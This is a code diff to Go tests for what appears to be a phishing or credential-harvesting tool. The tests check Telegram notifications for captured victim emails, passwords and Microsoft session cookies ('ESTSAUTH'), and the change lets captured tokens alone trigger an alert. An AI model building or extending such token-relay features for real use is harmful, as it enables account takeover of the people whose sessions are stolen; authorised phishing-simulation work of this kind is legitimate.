@@ -75,8 +75,7 @@ func TestTelegramCredentialsWithMinLength(t *testing.T) {
 }
 
 // TestTelegramTokens verifies the three token states: included, not-shown note,
-// and absent. In all cases valid credentials (username+password) are required
-// for the notification to be sent at all.
+// and token-only send (no credential toggles).
 func TestTelegramTokens(t *testing.T) {
 	// Full payload with creds + tokens.
 	e := makeSubmitEvent(url.Values{
@@ -105,11 +104,11 @@ func TestTelegramTokens(t *testing.T) {
 		t.Errorf("did not expect raw tokens, got:\n%s", msg)
 	}
 
-	// Tokens only (no credential toggles) → skipped entirely.
+	// Tokens only (no credential toggles, token toggle on) → sends with token content.
 	wh = &Webhook{TelegramIncludeTokens: true}
 	msg = wh.formatTelegramMessage(e)
-	if msg != "" {
-		t.Errorf("expected skip (tokens-only, no creds), got:\n%s", msg)
+	if !strings.Contains(msg, "Tokens: ") {
+		t.Errorf("expected token notification for token-only capture, got:\n%s", msg)
 	}
 }
 
@@ -144,43 +143,40 @@ func TestTelegramUsernamePattern(t *testing.T) {
 	}
 }
 
-// TestTelegramOnlyTokensDoesNotSend verifies that a notification is NOT sent
-// when only tokens are captured without valid credentials (username+password).
-// Credentials always require BOTH username and password to pass validation.
-func TestTelegramOnlyTokensDoesNotSend(t *testing.T) {
+// TestTelegramTokenOnlySend verifies that tokens alone trigger a notification
+// when they meet the minimum length, even without credential toggles.
+func TestTelegramTokenOnlySend(t *testing.T) {
 	e := makeSubmitEvent(url.Values{
-		"email":    {"victim@corp.com"},
-		"password": {"P@ss"},
-		"tokens":   {`[{"name":"ESTSAUTH","value":"abc"}]`},
+		"tokens": {`[{"name":"ESTSAUTH","value":"abc"}]`},
 	})
 
-	// Only tokens toggle on, no credential toggles → skip.
-	wh := &Webhook{
-		TelegramIncludeTokens: true,
-	}
+	// Token toggle on → sends with token content.
+	wh := &Webhook{TelegramIncludeTokens: true}
 	msg := wh.formatTelegramMessage(e)
-	if msg != "" {
-		t.Errorf("expected no notification for tokens-only (credentials required), got:\n%s", msg)
+	if !strings.Contains(msg, "Tokens: ") {
+		t.Errorf("expected token notification for token-only capture, got:\n%s", msg)
 	}
 
-	// Username toggle on but password toggle off → not a valid credentials pair.
-	wh = &Webhook{
-		TelegramIncludeUsername: true,
-		TelegramIncludeTokens:   true,
-	}
+	// Token toggle off but tokens captured → sends with "not shown" note.
+	wh = &Webhook{TelegramIncludeTokens: false}
 	msg = wh.formatTelegramMessage(e)
-	if msg != "" {
-		t.Errorf("expected no notification when only username toggle (no password toggle), got:\n%s", msg)
+	if !strings.Contains(msg, "🍪 Tokens captured (not shown)") {
+		t.Errorf("expected capture note even when toggle off, got:\n%s", msg)
 	}
 
-	// Password toggle on but username toggle off → not a valid credentials pair.
-	wh = &Webhook{
-		TelegramIncludePassword: true,
-		TelegramIncludeTokens:   true,
-	}
+	// Tokens below min length → skip.
+	wh = &Webhook{TelegramIncludeTokens: true, TelegramMinTokenLength: 10000}
 	msg = wh.formatTelegramMessage(e)
 	if msg != "" {
-		t.Errorf("expected no notification when only password toggle (no username toggle), got:\n%s", msg)
+		t.Errorf("expected skip when tokens below min length, got:\n%s", msg)
+	}
+
+	// No tokens in payload → skip (no credentials either).
+	eNoTokens := makeSubmitEvent(url.Values{"email": {"victim@corp.com"}})
+	wh = &Webhook{TelegramIncludeTokens: true}
+	msg = wh.formatTelegramMessage(eNoTokens)
+	if msg != "" {
+		t.Errorf("expected skip when no tokens in payload, got:\n%s", msg)
 	}
 }
 
